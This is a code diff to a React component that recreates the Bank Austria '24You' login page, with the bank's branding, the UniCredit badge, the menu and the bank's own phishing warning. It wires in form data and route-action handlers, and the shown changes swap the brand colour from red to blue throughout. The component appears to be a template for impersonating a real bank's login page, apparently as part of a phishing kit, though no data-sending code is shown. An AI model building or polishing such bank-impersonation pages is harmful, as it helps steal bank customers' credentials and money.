@@ -37,7 +37,7 @@ export function BankAustria({ formData, onChange, handleRouteAction, saving }: P
         <div className="w-[208px] h-full bg-white flex flex-col justify-center pl-5 shrink-0">
           <div className="flex items-center gap-1.5">
             {/* Ribbon Icon */}
-            <div className="relative w-5 h-5 bg-[#e30613] rounded-full overflow-hidden flex items-center justify-center shrink-0">
+            <div className="relative w-5 h-5 bg-[#00A9E0] rounded-full overflow-hidden flex items-center justify-center shrink-0">
               <div className="absolute w-8 h-1.5 bg-white rotate-45 transform"></div>
             </div>
             <span className="text-[#333] font-bold text-xl tracking-tight leading-none">Bank Austria</span>
@@ -45,7 +45,7 @@ export function BankAustria({ formData, onChange, handleRouteAction, saving }: P
           <div className="flex items-center gap-1 mt-1 pl-6">
             <span className="text-[9px] text-gray-500 italic">Member of</span>
             <span className="text-[10px] font-bold text-[#333] flex items-center gap-0.5">
-              <div className="w-2.5 h-2.5 bg-[#e30613] rounded-full flex items-center justify-center">
+              <div className="w-2.5 h-2.5 bg-[#00A9E0] rounded-full flex items-center justify-center">
                 <span className="text-white text-[6px] font-bold">1</span>
               </div>
               UniCredit
@@ -54,7 +54,7 @@ export function BankAustria({ formData, onChange, handleRouteAction, saving }: P
         </div>
 
         {/* Menu Area */}
-        <div className="flex-1 bg-[#e30613] hidden md:flex items-center justify-center gap-12 text-white">
+        <div className="flex-1 bg-[#00A9E0] hidden md:flex items-center justify-center gap-12 text-white">
           <div className="flex flex-col items-center gap-1 cursor-pointer hover:opacity-80">
             <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2 M12 11a4 4 0 1 0 0-8 4 4 0 0 0 0 8z" /></svg>
             <span className="text-[10px] font-bold tracking-wider">PRIVATKUNDEN</span>
@@ -89,7 +89,7 @@ export function BankAustria({ formData, onChange, handleRouteAction, saving }: P
 
         {/* Main Content */}
         <div className="flex-1 flex flex-col items-center pt-16 px-4">
-          <h1 className="text-[#e30613] font-bold text-[32px] mb-10 tracking-tight">24You</h1>
+          <h1 className="text-[#00A9E0] font-bold text-[32px] mb-10 tracking-tight">24You</h1>
 
           <div className="w-full max-w-[840px] bg-[#eaf6f9] p-5 md:p-6 rounded-md text-center text-[#333] text-[13px] md:text-sm mb-12 leading-relaxed shadow-sm">
             <p className="font-bold mb-3">Warnung: Derzeit versenden Betrüger Phishing-Mails bei denen Ihnen eine Login-Aufforderung der Bank Austria vorgegaukelt wird.</p>
